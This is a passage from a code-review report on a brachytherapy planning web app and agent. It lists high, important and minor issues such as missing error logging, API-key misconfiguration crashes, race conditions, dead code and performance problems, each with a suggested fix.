The cache also only checks `source`, `label_id`, `total_voxels`, and `mask_shape_key` — two different arrays with the same dimensions and voxel count but different spatial distributions produce the same cache key but should have different meshes.

**Impact:** Users may see incorrect mesh geometry (e.g., CTV contour from a previous patient on a new patient's scan) when memory addresses happen to collide. This is a data contamination risk for clinical review.

**Fix:** Use a content-based hash instead of `id()`:
```python
import hashlib
mask_hash = hashlib.md5(mask_data.tobytes()).hexdigest()
cache_key = (source, label_id, str(smoothing_key), mask_hash, mask_shape_key, total_voxels)
```
Or use a generation counter:
```python
_MESH_GENERATION = 0
cache_key = (source, label_id, str(smoothing_key), _MESH_GENERATION, mask_shape_key, total_voxels)
```

---

## H21. 500 error handler doesn't log exception — debugging impossible

| Field | Value |
|-------|-------|
| **File** | `web/server.py` |
| **Line** | 855-857 |
| **Severity** | HIGH — internal server errors invisible in production |

**Problem:** The 500 error handler catches the exception object but never logs it:

```python
# server.py:855-857
@app.errorhandler(500)
def server_error(e):
    return jsonify({"error": "Internal server error"}), 500
    # ← 'e' is never logged!
```

The Flask `app.errorhandler` receives the exception object `e`, but the handler just returns a generic JSON response without recording the exception. The original traceback is lost because Flask's default error logging is suppressed by the custom handler.

**Impact:** When an internal server error occurs (e.g., a bug in a route handler, an unexpected database error), the server returns a generic 500 with no indication of what went wrong. Developers must reproduce the error locally with debug mode enabled to diagnose. In production, errors are completely invisible — no logs, no metrics, no alerts.

**Fix:** Log the exception before returning:
```python
@app.errorhandler(500)
def server_error(e):
    logger.exception("Internal server error")  # ← Logs full traceback
    return jsonify({"error": "Internal server error"}), 500
```

---

## H22. `API_KEY=None` crash when `BRACHYBOT_REQUIRE_API_KEY=1`

| Field | Value |
|-------|-------|
| **File** | `web/server_support.py` |
| **Line** | 56-59, 947-956 |
| **Severity** | HIGH — `AttributeError: 'NoneType' has no attribute 'encode'` |

**Problem:** The authentication logic allows a configuration where `_API_KEY_REQUIRED = True` but `API_KEY = None`:

```python
# server_support.py:56-59
_API_KEY_REQUIRED = (bool(API_KEY) and not _TRUST_NETWORK) or \
    os.environ.get("BRACHYBOT_REQUIRE_API_KEY", "").lower() in TRUE_VALUES
```

If `BRACHYBOT_REQUIRE_API_KEY=1` is set but `BRACHYBOT_API_KEY` is NOT set, then:
- `bool(API_KEY)` is `False` (API_KEY is None)
- `_API_KEY_REQUIRED` is still `True` (from the env var)
- `API_KEY` is still `None`

This causes crashes in two places:

```python
# server_support.py:947-949 — _valid_api_key_from_request:
hashlib.sha256(request_key.encode()).hexdigest()
# ... but reaches this first:
hashlib.sha256(API_KEY.encode()).hexdigest()  # ← AttributeError: NoneType has no 'encode'

# server_support.py:955-956 — _screenshot_signature:
return hmac.new(API_KEY.encode("utf-8"), ...)  # ← Same crash
```

**Impact:** If an administrator sets `BRACHYBOT_REQUIRE_API_KEY=1` without also setting `BRACHYBOT_API_KEY`, the server starts successfully but crashes on the first request that requires authentication or screenshot signing. The error message ("'NoneType' object has no attribute 'encode'") is opaque and doesn't hint at the configuration issue.

**Fix:** Either generate a random key when enforcement is requested but no key is provided:
```python
if not API_KEY:
    API_KEY = secrets.token_urlsafe(32)
    logger.info("Generated random API key (BRACHYBOT_REQUIRE_API_KEY=1 without BRACHYBOT_API_KEY)")
```
Or refuse to start with a clear error:
```python
if _API_KEY_REQUIRED and not API_KEY:
    raise RuntimeError("BRACHYBOT_REQUIRE_API_KEY=1 but BRACHYBOT_API_KEY is not set")
```

---

# IMPORTANT (25)

---

## I1. `get_status()` checks wrong memory key `ct_data`

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/chat_workflows.py:1930` |
| **Severity** | IMPORTANT — `get_status()` always returns `"ct_loaded": False` |

**Problem:** `self.memory.retrieve("ct_data")` — the key `"ct_data"` is never stored anywhere. The actual key used everywhere is `"ct_image"`:

```python
# chat_workflows.py:1930 — WRONG KEY:
"ct_loaded": self.memory.retrieve("ct_data") is not None,

# Everywhere else — CORRECT KEY:
# llm_runtime.py:48: self.memory.retrieve("ct_image")
# llm_runtime.py:551: self.memory.store("ct_image", ct_img)
# chat_workflows.py:582: self.memory.retrieve("ct_image")
```

**Impact:** The `get_status()` API endpoint always returns `"ct_loaded": False`, even when a CT is fully loaded in agent memory. Any client-side logic that checks this status (e.g., frontend "CT loaded" indicator, training monitor readiness check, pre-planning validation) will always think no CT is loaded.

**Fix:** Change `"ct_data"` to `"ct_image"`:
```python
"ct_loaded": self.memory.retrieve("ct_image") is not None,
```

---

## I2. Dead `session_context` parameter in planning routes

| Field | Value |
|-------|-------|
| **File** | `web/routes/planning_routes.py:57` |
| **Severity** | IMPORTANT — parameter passed but never used |

**Problem:** `register_planning_routes` accepts a `session_context` parameter containing `_sessions`, `_session_timestamps`, etc., but never references it in the function body:

```python
# planning_routes.py:57
def register_planning_routes(app, get_agent, session_context=None):
```

The call site at `server.py:827` passes a fully populated dict:
```python
register_planning_routes(app, get_agent, session_context={
    "sessions": _sessions,
    "session_timestamps": _session_timestamps,
    "sessions_lock": _sessions_lock,
    "default_session_id": _default_session_id,
    "session_timeout": _session_timeout,
    "max_sessions": _max_sessions,
})
```

All route handlers use `get_agent()` (the closure parameter) instead of `session_context`. The entire dict is dead code.

**Impact:** Misleading API. Future maintainers might add session access via `session_context` instead of the canonical `get_agent()` closure, introducing session management bugs and inconsistent locking patterns.

**Fix:** Remove the parameter and the call-site argument, or add a documentation comment explaining it's reserved.

---

## I3. 55+ production `console.log` calls across JS files

| **File** | **Approx count** |
|----------|-----------------|
| `brachybot-dvh-planning.js` | ~30 (lines 341-1206) |
| `brachybot-3d-manual.js` | ~25 (lines 800-1879) |
| `brachybot-chat-core.js` | 2 (lines 29, 91) |
| `brachybot-chat-todo.js` | Many (lines 1051-1240) |
| `brachybot-viewer-layout.js` | Several |

Examples:
```javascript
// dvh-planning.js
console.log('[drawDVH] called');
console.log('[refreshPlanningUI] CALLED, stack:', new Error().stack);

// 3d-manual.js
console.log('addMeshToScene:', source, labelId);
console.log('Dose overlay slice loaded');
```

**Impact:** Console noise in production makes it hard to identify real issues. Slight performance overhead from string serialization and stack trace generation in hot paths (DVH rendering, 3D scene updates). Some log lines expose internal state that could confuse users who open DevTools.

**Fix:** Gate debug logging behind a global flag:
```javascript
if (window._DEBUG_BRACHYBOT) {
    console.log('[drawDVH] called');
}
```

Remove all unconditioned `console.log`/`console.warn` calls. Keep only `console.error` for actual error conditions.

---

## I4. `data_available` never populated in `conversation_state`

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/core.py:131` |
| **Severity** | IMPORTANT — dead state key |

**Problem:** The `conversation_state` dict initializes `"data_available"` as an empty list but nothing ever writes to it:

```python
# core.py:131
self.conversation_state: Dict = {
    "ctv_segmented": False,
    "oar_segmented": False,
    "planning_completed": False,
    "last_tool_calls": [],
    "data_available": [],     # ← Never populated
}
```

**Impact:** If any code reads `conversation_state["data_available"]` to determine what data is loaded, it always gets an empty list. This could cause false negatives in data availability checks. The key is technically dead state — it initializes memory that's never updated.

**Fix:** Either remove the key or implement population logic that tracks loaded data types.

---

## I5. `dose_calc` used instead of `dose_engine` in planning tool set

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/core.py:1180-1183` |
| **Severity** | IMPORTANT — planning detection misses `dose_engine` calls |

**Problem:** The `planning_tools` set used for determining if planning has been performed contains wrong tool names:

```python
# core.py:1180-1183
planning_tools = {"ctv_segmentation", "oar_segmentation",
                  "planning_pipeline", "seed_planning",
                  "dose_calc", "dose_evaluation",                     # ← "dose_calc" not "dose_engine"
                  "trajectory_init", "trajectory_refine"}             # ← sub-step names, not tool names
```

The actual tool names registered in the system are `dose_engine` and `trajectory_planning`. The sub-step names `dose_calc`, `trajectory_init`, `trajectory_refine` are internal operation names, not tool registration keys.

**Impact:** If `dose_engine` is the only planning tool called (common in step-by-step planning), the `is_planning` check fails, and the brief-response prompt is used instead of the comprehensive planning template. Users get abbreviated responses even after dose calculation.

**Fix:** Use the actual tool registration names:
```python
planning_tools = {"ctv_segmentation", "oar_segmentation",
                  "planning_pipeline", "seed_planning",
                  "dose_engine", "dose_evaluation",
                  "trajectory_planning"}
```

---

## I6. `print()` instead of `logger` in production code

| Field | Value |
|-------|-------|
| **File** | `AgenticSys.py:1737,1740,1743` |
| **Severity** | IMPORTANT — diagnostic data written to stdout |

**Problem:** Debug `print()` statements are left in production code:

```python
# AgenticSys.py:1737
print(f"[STORE] Skipping {tool_name}: not successful")

# AgenticSys.py:1740
print(f"[STORE] {tool_name}: metadata keys={list(meta.keys())}")

# AgenticSys.py:1743
print(f"[STORE] Storing ctv_array, shape={...}")
```

**Impact:** `print()` writes to stdout, which may expose internal diagnostic data in server logs or console output. In production deployments with log aggregation, these messages mix with structured logging and are harder to filter. They also cannot be controlled by log level settings — they always output.

**Fix:** Replace with `logger` calls:
```python
logger.debug("Skipping %s: not successful", tool_name)
logger.debug("%s: metadata keys=%s", tool_name, list(meta.keys()))
```

---

## I7. `_has_completed_planning_in_steps` only checks `planning_pipeline`

| Field | Value |
|-------|-------|
| **File** | `AgenticSys.py:739-746` |
| **Severity** | IMPORTANT — misses planning done via individual tools |

**Problem:** The function only checks if `planning_pipeline` is in the completed steps:

```python
# AgenticSys.py:739-746
def _has_completed_planning_in_steps(self, steps=None):
    return bool(steps) and any(
        s.get("type") == "tool" and s.get("status") == "done"
        and s.get("tool") == "planning_pipeline"   # ← Only checks this one tool name
        for s in steps
    )
```

But the LLM loops at `llm_runtime.py:419-423` and `:1450-1454` check a BROADER set including `seed_planning`, `trajectory_planning`, `dose_engine`, `dose_evaluation`. If planning was done through individual tools instead of the unified pipeline:
1. `_has_completed_planning_in_steps` returns `False`
2. The safety-net regeneration at `chat_with_stream:751-764` runs
3. This may produce a duplicate report

**Impact:** Users who plan via individual tools (e.g., "run trajectory planning", "calculate dose") may receive duplicate reports — one from the LLM loop and one from the safety-net.

**Fix:** Broaden the check to match the LLM loop's detection set:
```python
planning_tool_names = {"planning_pipeline", "seed_planning", "trajectory_planning", "dose_engine", "dose_evaluation"}
return bool(steps) and any(
    s.get("type") == "tool" and s.get("status") == "done"
    and s.get("tool") in planning_tool_names
    for s in steps
)
```

---

## I8. `organ_counts.get(n, 0)` with name key is always 0

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/chat_workflows.py:829-833` |
| **Severity** | IMPORTANT — sort key never matches, sort is no-op |

**Problem:** The sort lambda passes an organ NAME to a dict keyed by label ID:

```python
# chat_workflows.py:832
_key=lambda n: (self.memory.retrieve("organ_counts", {}) or {}).get(n, 0),
```

Here `n` is an organ name (string like "liver", "kidney") but `organ_counts` is structured like `{1: 1000, 2: 500, 3: 200}` (label ID → voxel count). Calling `.get("liver", 0)` always returns `0` because `"liver"` is not a key in the dict.

**Impact:** The organ list shown to the user is sorted alphabetically (the natural order when all sort keys are 0) rather than by voxel count (largest organs first). This means the user sees organs in alphabetical order instead of clinical relevance order.

**Fix:** Look up via `organ_names` mapping:
```python
organ_counts = self.memory.retrieve("organ_counts", {}) or {}
organ_names = self.memory.retrieve("organ_names", {}) or {}
_key=lambda n: next(
    (count for lid, count in organ_counts.items() if organ_names.get(lid) == n),
    0
)
```

---

## I9. `_chatHistory` array grows unbounded

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-chat-todo.js` |
| **Line** | 624 |
| **Severity** | IMPORTANT — memory leak over long sessions |

**Problem:** The `_chatHistory` array is initialized and appended to on every user input without any cap:

```javascript
// chat-todo.js:624
const _chatHistory = [];

// Pushed on every Enter keypress:
// chat-todo.js:~650
_chatHistory.push({ text, ts: Date.now(), options });
```

**Impact:** Over a long session with thousands of messages, the array consumes increasing memory. It's never trimmed or limited. On a machine with limited memory (e.g., the clinical workstation this will run on), this could cause the page to slow down or crash after extended use.

**Fix:** Cap the history:
```javascript
_chatHistory.push({ text, ts: Date.now(), options });
if (_chatHistory.length > 500) {
    _chatHistory.splice(0, _chatHistory.length - 500);  // Keep last 500
}
```

---

## I10. `dataTreeState.planning.seeds.forEach` without null guard

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-viewer-volume.js` |
| **Line** | 2002-2004 |
| **Severity** | IMPORTANT — throws if seeds/needles/doseLevels is null |

**Problem:** `soloGroup` traverses planning sub-arrays without null checks:

```javascript
// viewer-volume.js:2002-2004
dataTreeState.planning.seeds.forEach(s => { s.visible = (category === 'planning_seeds'); });
dataTreeState.planning.needles.forEach(s => { s.visible = (category === 'planning_needles'); });
dataTreeState.planning.doseLevels.forEach(d => { d.visible = (category === 'planning_dose'); });
```

If planning data hasn't been loaded yet (no seeds, needles, or dose levels), these objects may be `undefined` or `null`, and `.forEach()` throws `TypeError: Cannot read property 'forEach' of undefined`.

**Impact:** Clicking the "solo" button in the data tree before planning runs causes a JavaScript error. The data tree becomes unusable until page refresh.

**Fix:** Add optional chaining or guard:
```javascript
(dataTreeState.planning.seeds || []).forEach(s => { ... });
(dataTreeState.planning.needles || []).forEach(s => { ... });
(dataTreeState.planning.doseLevels || []).forEach(d => { ... });
```

---

## I11. `batchSetOpacity` / `setDataOpacity` may not be defined when referenced from `onclick`

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-viewer-volume.js:1666,2130` |
| **Severity** | IMPORTANT — slider/context menu breaks if function not defined |

**Problem:** Two inline `onclick`/`oninput` handlers reference functions that may not be defined:

```javascript
// viewer-volume.js:1666 — in renderTreeItem:
oninput="setDataOpacity('${id}', this.value)"

// viewer-volume.js:2130 — in context menu builder:
onclick="hideContextMenu();batchSetOpacity(${op / 100})"
```

The function `setDataOpacity` is defined at line 1683 (inside the same file) and `batchSetOpacity` at line 2122. Since both are loaded from the same file, they should be available. But because these are inlined `onclick` strings, they execute in the global scope. If these functions are declared with `function` keyword or `var` assignment, they become global. If declared with `const` or `let` at module level, they are NOT global and the onclick cannot find them.

**Impact:** If `setDataOpacity` or `batchSetOpacity` are declared with `const`/`let` (block-scoped, not global), clicking the slider or context menu item throws `ReferenceError`, and the opacity adjustment silently fails.

**Fix:** Use `addEventListener` in JavaScript instead of inline `onclick`:
```javascript
slider.addEventListener('input', () => setDataOpacity(id, slider.value));
```

---

## I12. Auto-OAR logic triplicated across 3 files (~130 lines each)

| **File** | **Lines** |
|----------|-----------|
| `AgenticSys.py` | 1200-1328 |
| `agent_runtime/llm_runtime.py` | 1929-2038 |
| `agent_runtime/chat_workflows.py` | 979-1206 |

**Problem:** The same 130-line "if CTV segmentation done and OAR not full, auto-run OAR segmentation" logic is independently copy-pasted into three execution paths. Each copy has slight variations:
- `AgenticSys.py` (inside `_execute_tool_with_memory`): synchronous, checks `conversation_state`
- `llm_runtime.py` (inside `_run_llm_function_calling_stream`): uses thread + heartbeat, different CTV-done detection
- `chat_workflows.py` (inside workflow enforcer): uses yet another CTV-loaded detection

**Impact:** Any bug fix or behavior improvement must be applied to all three copies. If only one is fixed, the bug persists in the other two paths. The variations in detection logic mean that auto-OAR may trigger in one execution mode but not another.

**Fix:** Extract into a single shared helper:
```python
def _auto_run_oar_if_needed(self, yield_event=None):
    """Check if CTV is done and OAR is not full, then auto-run OAR segmentation."""
    ctv_done = self.memory.conversation_state.get("ctv_segmented", False)
    oar_done = self.memory.conversation_state.get("oar_segmented", False)
    if ctv_done and not oar_done:
        oar_data = self.memory.retrieve("oar_array")
        if oar_data is None or ...:
            return self._execute_tool_with_memory("oar_segmentation")
    return None
```

---

## I13. 80% duplication between streaming and non-streaming LLM loops

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/llm_runtime.py` |
| **Line** | 31-696 (non-stream), 948-2237 (stream) |
| **Severity** | IMPORTANT — ~1300 lines duplicated, ~300 unique each |

**Problem:** The two LLM function-calling methods share approximately 80% of their logic:
- Enhanced context construction: ~40 lines × 2
- Forced search implementation: ~50 lines × 2 (with the C3 indentation bug in stream)
- Message building: ~50 lines × 2
- Tool iteration loop: ~100+ lines × 2
- Post-tool instruction: ~60 lines × 2
- Response fallback logic: ~100+ lines × 2

The streaming version has ~300 unique lines (text chunk yielding, tool_progress, heartbeat). The non-streaming has ~100 unique lines (response sentence stripping, token accumulation).

**Impact:** Every time a fix is applied to one method, it must be manually ported to the other. Currently, the streaming method has the C3 indentation bug that the non-streaming method doesn't have. Future fixes will likely diverge similarly.

**Fix:** Create shared helper functions:
```python
def _prepare_llm_messages(self, message, steps, ...) -> Tuple[str, List]:
    """Build system prompt and message history (shared by both streaming and non-streaming)."""
    ...

def _process_tool_results(self, tool_calls, ...) -> Tuple[str, List]:
    """Process tool call results (shared)."""
    ...

def _finalize_response(self, response_text, ...) -> str:
    """Clean and format the final response (shared)."""
    ...
```

The streaming loop then only contains SSE-yielding logic.

---

## I14. `_convert_anthropic_to_openai_messages` dead code

| Field | Value |
|-------|-------|
| **File** | `AgenticSys.py:1681-1732` |
| **Severity** | IMPORTANT — ~50 lines of zero-caller code |

**Problem:** The method `_convert_anthropic_to_openai_messages` is defined (52 lines) but never called anywhere in the codebase:

```python
# AgenticSys.py:1681-1732
def _convert_anthropic_to_openai_messages(self, messages: List) -> List:
    """Convert Anthropic-format messages to OpenAI-compatible format."""
    openai_messages = []
    for msg in messages:
        ...
    return openai_messages
```

All LLM providers already use OpenAI-format messages directly. This conversion function was likely written during a migration from Anthropic to OpenAI format and is now unused.

**Impact:** Dead code increases maintenance burden and confuses new developers who may wonder why Anthropic conversion exists when the system uses OpenAI format.

**Fix:** Remove the method.

---

## I15. `_global_agent` resolution pattern copy-pasted 8+ times in route files

| Field | Value |
|-------|-------|
| **File** | `web/routes/planning_routes.py` (8+ occurrences) |
| **Severity** | IMPORTANT — repetitive code, update requires 8+ edits |

**Problem:** The agent resolution idiom `import AgenticSys as _ag; agent = getattr(_ag, '_global_agent', None) or get_agent()` appears in almost every route handler:

```python
# planning_routes.py:65, 109, 506, 566, 682, 766, 839, 1053 (etc.)
import AgenticSys as _ag
agent = getattr(_ag, '_global_agent', None) or get_agent()
if agent is None:
    return jsonify({"error": "Agent not initialized"}), 500
```

**Impact:** If the agent resolution pattern changes (e.g., `_global_agent` is renamed or `get_agent()` signature changes), all 8+ copies must be updated. Any missed copy introduces a subtle bug where some routes work and others don't.

**Fix:** Extract into a shared helper:
```python
# In server_support.py:
def _resolve_agent(get_agent):
    import AgenticSys as _ag
    agent = getattr(_ag, '_global_agent', None) or get_agent()
    return agent

# In each route handler:
agent = _resolve_agent(get_agent)
if agent is None:
    return jsonify({"error": "Agent not initialized"}), 500
```

---

## I16. `builtins` monkey-patch pollutes global namespace

| Field | Value |
|-------|-------|
| **File** | `web/server.py` |
| **Line** | 957-959 |
| **Severity** | IMPORTANT — potential conflict with other libraries |

**Problem:** The `run_server()` function injects objects into Python's builtins namespace:

```python
# server.py:957-959
import builtins
builtins.track_operation = _OperationContext
builtins.get_active_operations = get_active_operations
```

This pollutes the global namespace that ALL Python code sees. Any other library that iterates over builtins or checks for specific names will see these entries. If another library defines a `track_operation` function, it gets silently overwritten.

**Impact:** Unexpected behavior in any other code that reads `builtins`. If `get_active_operations` or `track_operation` ever need to be changed, stale references in other modules will use the old versions until those modules are reloaded.

**Fix:** Use a module-level registry or explicit dependency injection:
```python
# Instead of builtins:
_operation_registry = {}
```

---

## I17. Hardcoded upload path duplicates `UPLOAD_DIR` constant

| Field | Value |
|-------|-------|
| **File** | `web/server.py:272-273` |
| **Severity** | IMPORTANT — divergence risk if directory structure changes |

**Problem:** The `api_viewer_image` route computes the upload directory inline instead of using the shared constant:

```python
# server.py:272-273 — inline computation:
upload_dir = os.path.realpath(os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "uploads"
))

# Compared to server_support.py:32-33 — shared constant:
PROJECT_ROOT = os.path.realpath(os.path.join(WEB_DIR, ".."))
UPLOAD_DIR = os.path.realpath(os.path.join(PROJECT_ROOT, "uploads"))
```

**Impact:** If the project directory structure changes, `UPLOAD_DIR` (the shared constant) gets updated, but the inline version in `api_viewer_image` becomes stale. The route would look for uploads in a non-existent directory, and image viewing breaks for all users.

**Fix:** Use the shared `UPLOAD_DIR` constant:
```python
# server.py — use imported UPLOAD_DIR:
if not image_path.startswith(UPLOAD_DIR + os.sep):
    return jsonify({"error": "Access denied"}), 403
```

---

## I18. `_captureScreenshot` — `.then()` inside `async` function loses promise

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-ui-api.js` |
| **Line** | 2075 |
| **Severity** | IMPORTANT — screenshot may be incomplete |

**Problem:** Inside an `async` function, `.then()` is used instead of `await`:

```javascript
// ui-api.js:2075
async function _captureScreenshot(target, ...) {
    ...
    html2canvas(el).then(canvas => {
        // Process canvas...
    });
    // ← Function returns here before .then() callback runs!
}
```

Because `await` is not used, the function returns a resolved promise before `html2canvas` finishes rendering. The caller gets the promise back, awaits it, and thinks the screenshot is complete — but the canvas capture may still be in progress.

**Impact:** Screenshots captured during planning or report generation may be blank, partially rendered, or contain stale content. The `_interceptScreenshot` function adds a 500ms setTimeout to mitigate this, but that's a workaround for the actual bug.

**Fix:** Use `await`:
```javascript
async function _captureScreenshot(target, ...) {
    ...
    const canvas = await html2canvas(el);
    // Process canvas...
}
```

---

## I19. `_interceptScreenshot` — race condition with 500ms setTimeout

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-ui-api.js` |
| **Line** | 2331 |
| **Severity** | IMPORTANT — rapid calls race; no abort mechanism |

**Problem:** The `_interceptScreenshot` function uses a 500ms `setTimeout` before capturing:

```javascript
// ui-api.js:2331
setTimeout(() => {
    _captureScreenshotDataUrl(normalizedTarget, el).then(dataUrl => {
        // use dataUrl
    });
}, 500);
```

If `_interceptScreenshot` is called twice rapidly (e.g., two SSE events fire quickly during planning), two timeouts are created. Both fire after 500ms, and both try to capture the same target. The second capture may:
1. See a different panel state (the first capture already switched panels)
2. Overwrite the first capture's result
3. Both try to switch to the same panel simultaneously

No `AbortController` or cancellation mechanism is used (unlike `fetchDoseOverlaySlice` in `3d-manual.js:1859-1891` which uses a version counter).

**Impact:** Screenshot ordering or content may be incorrect during rapid planning events. If the panel switch in `_resolveScreenshotTarget` is triggered twice, the second call might try to capture a stale target.

**Fix:** Add an abort mechanism:
```javascript
let _screenshotAbortController = null;

async function _interceptScreenshot(...) {
    if (_screenshotAbortController) {
        _screenshotAbortController.abort();
    }
    _screenshotAbortController = new AbortController();
    await new Promise(resolve => setTimeout(resolve, 500));
    if (_screenshotAbortController.signal.aborted) return;
    // ... capture
}
```

---

## I20. `reconstructOrgan3D` — hardcoded label IDs `[1, 2, 3, 4, 5, 6]`

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-viewer-layout.js` |
| **Line** | 680 |
| **Severity** | IMPORTANT — additional organs (labels >6) never reconstructed in 3D |

**Problem:** The 3D organ reconstruction loops over exactly 6 hardcoded label IDs:

```javascript
// viewer-layout.js:680
const labelIds = [1, 2, 3, 4, 5, 6]; // All non-background labels
```

TotalSegmentator produces 104+ organ classes with label IDs up to 119+. Any organ with a label ID >6 (e.g., liver=1, kidney=2, but also: spleen=3, pancreas=4, gallbladder=5, esophagus=6, stomach=7, duodenum=8, colon=9, etc.) is silently skipped. Labels 7+ are never reconstructed in 3D.

**Impact:** Users cannot see 3D reconstructions of organs with label IDs >6 (stomach, duodenum, colon, and dozens of other structures). The 3D view is limited to only 6 of the 100+ possible organs, significantly limiting its clinical utility.

**Fix:** Read the actual label IDs from the loaded label data:
```javascript
const ctvLabels = window._ctvLabelMap || {};
const actualLabelIds = Object.keys(ctvLabels).map(Number).filter(k => k > 0);
const labelIds = actualLabelIds.length > 0 ? actualLabelIds : [1, 2, 3, 4, 5, 6];
```

---

## I21. `_applyDoseTextureToMesh` — sequential HTTP requests per vertex

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-viewer-layout.js` |
| **Line** | 1008 |
| **Severity** | IMPORTANT — 12,500+ sequential fetches for a single mesh |

**Problem:** The dose texture application loops over every mesh vertex and makes an individual async request per iteration:

```javascript
// viewer-layout.js:1008
for (let i = 0; i < positions.length; i += sampleEvery) {
    const idx = ...;
    const doseNorm = await _sampleDoseNormalizedAtIndex(idx);  // ← 1 HTTP fetch per vertex
    // ...
}
```

For a mesh with 25,000 vertices and `sampleEvery=2`, this makes 12,500 sequential HTTP requests to `/api/planning/dose_overlay_slice`. Even with the `state.doseTexture.rawAxialSlices` cache, spatially distributed mesh vertices across many Z slices will require many unique fetches. At 50ms per request, this takes ~10 minutes.

**Impact:** The 3D dose texture overlay is effectively unusable for any non-trivial mesh. Users who enable "dose texture" mode on the 3D view will experience a multi-minute hang while thousands of sequential HTTP requests complete.

**Fix:** Batch the requests by Z-slice:
```javascript
// Group vertices by Z-slice, fetch each slice once
const sliceRequests = {};
for (let i = 0; i < positions.length; i += sampleEvery) {
    const zSlice = Math.round(positions[i+2]);
    if (!sliceRequests[zSlice]) {
        sliceRequests[zSlice] = [];
    }
    sliceRequests[zSlice].push(i);
}
// Fetch all unique slices in parallel
const slices = await Promise.all(
    Object.keys(sliceRequests).map(z => fetch(`/api/planning/dose_overlay_slice?z=${z}`).then(r => r.json()))
);
// Apply fetched data to vertices
for (const [z, indices] of Object.entries(sliceRequests)) {
    const sliceData = slices.find(s => s.z == z);
    for (const idx of indices) { ... }
}
```

---

## I22. Orphan `RLock` created via `getattr(agent.memory, "_lock", threading.RLock())`

| Field | Value |
|-------|-------|
| **File** | `web/routes/planning_routes.py` |
| **Line** | 1450 |
| **Severity** | IMPORTANT — TOCTOU race; lock that nobody else uses |

**Problem:** `getattr` with a default creates a NEW `RLock()` every time it's called if the attribute doesn't exist:

```python
# planning_routes.py:1450
with getattr(agent.memory, "_lock", threading.RLock()):
    conv = agent.memory.conversation
    # modify conv
```

If `agent.memory` doesn't have a `_lock` attribute:
1. `getattr` returns a brand new `threading.RLock()` object
2. The `with` block acquires this orphan lock that NO other code knows about
3. The `conversation` is accessed/modified without any real synchronization
4. The orphan lock is released after the block and garbage collected

This is a TOCTOU (Time Of Check To Time Of Use) race condition — between the `getattr` call and the `with` block, another thread could be accessing `conversation` simultaneously.

**Impact:** In multi-threaded environments, concurrent access to `agent.memory.conversation` is not properly synchronized, leading to potential data corruption. The "lock" provides false confidence.

**Fix:** Always use the real lock or accept the risk explicitly:
```python
memory_lock = getattr(agent.memory, "_lock", None)
if memory_lock:
    with memory_lock:
        ...
else:
    # No lock available — document the race risk
    ...
```

---

## I23. Overlay mask computed on raw HU, rendered on windowed image

| Field | Value |
|-------|-------|
| **File** | `web/routes/viewer_routes.py` |
| **Line** | 219 |
| **Severity** | IMPORTANT — threshold overlay invisible when window excludes the range |

**Problem:** The threshold overlay mask is computed on raw Hounsfield Unit data, but rendered on top of a windowed/leveled grayscale image:

```python
# viewer_routes.py:219
mask = ct_data > threshold      # computed on raw HU values

# Later: slice_rgb is the windowed image (window center/width applied)
slice_rgb[mask_slice, 0] = ...  # overlay applied over windowed data
```

If the user sets the window center/width to values that exclude the threshold range (e.g., window=1500, level=-500 for lung imaging, threshold=-200 for bone), the highlighted overlay region appears on an invisible or near-uniform background. For example, threshold=-200 (bone) with lung window (level=-500, width=1500) means bone pixels are rendered as white, but the overlay is a colored tint on white pixels — barely visible.

**Impact:** Users who adjust the window/level may find that threshold-based overlays become invisible. The overlay appears to disappear, confusing the user.

**Fix:** Apply the window/level to `ct_data` first, then compute the mask on the same data:
```python
# Apply window/level to ct_data:
ct_windowed = np.clip((ct_data - level) / width + 0.5, 0, 1)
# Compute mask on the original HU data (NOT windowed):
mask = ct_data > threshold
# Apply overlay on windowed data:
slice_rgb[mask_slice, 0] = overlay_color
```

---

## I24. Zero test coverage for `agent_runtime/` and `web/routes/`

| Field | Value |
|-------|-------|
| **File** | Entire project |
| **Severity** | IMPORTANT — no regression safety for core modules |

**Problem:** After the modularization, two critical module groups have ZERO unit tests:
- `agent_runtime/` (5 files, 6600+ lines): Core agent logic including LLM function calling, tool execution, response formatting, chat workflows
- `web/routes/` (2 files, 3300+ lines): All API route handlers including planning, viewer, export, and UI bridge endpoints

The existing tests (`tests/test_brain_system.py`) test the OLD architecture's `brain/` module, which is separate from the new core.

**Impact:** Any refactoring or bug fix in `agent_runtime/` or `web/routes/` must be verified manually. There are no automated regression guards. The C1, C2, C3, C7, C8, C9, C10 bugs (all CRITICAL or HIGH) discovered in this review would have been caught by basic unit tests.

**Fix:** Add unit tests for at minimum:
1. `AgentMemory` operations (store, retrieve, clear, compact)
2. `ToolResultPipeline.format()` with various tool results
3. Each major chat workflow path
4. Each API route handler (via Flask test client)

---

## I25. `{current_date}` never replaced in system prompt (duplicate of C12)

This is a duplicate reference to issue C12. The `{current_date}` template variable in `system_prompt.md:2` is at risk of not being replaced depending on the code path that loads it. See C12 for full details.

---

# MINOR (30)

---

## M1. Unused imports across `agent_runtime/`

**File:** `agent_runtime/response_tools.py` — unused:
- `base64` (line 8), `io` (line 9), `traceback` (line 16), `datetime` (line 17)
- `unquote`, `urlparse` from `urllib.parse` (line 19)
- `SimpleITK as sitk` (line 22)
- `SYSTEM_PROMPT_TEMPLATE`, `get_prompt_modules` from `config.prompts` (line 24)
- `PlanningPhase` from `agent_runtime.core` (line 25)

**File:** `agent_runtime/chat_workflows.py` — unused:
- `base64` (line 8), `io` (line 9), `datetime` (line 17)
- `unquote`, `urlparse` from `urllib.parse` (line 19)
- `SYSTEM_PROMPT_TEMPLATE`, `get_prompt_modules` from `config.prompts` (line 24)

**File:** `agent_runtime/llm_runtime.py`:
- Duplicate `import datetime` at lines 170 and 305

**Impact:** Littered imports confuse developers about what the module actually needs. The duplicate `datetime` import suggests a merge artifact.

**Fix:** Remove all unused imports. Remove the duplicate `import datetime`.

---

## M2. F-strings in logger calls (~30 occurrences across `agent_runtime/`)

**Examples:**
```python
# core.py:246
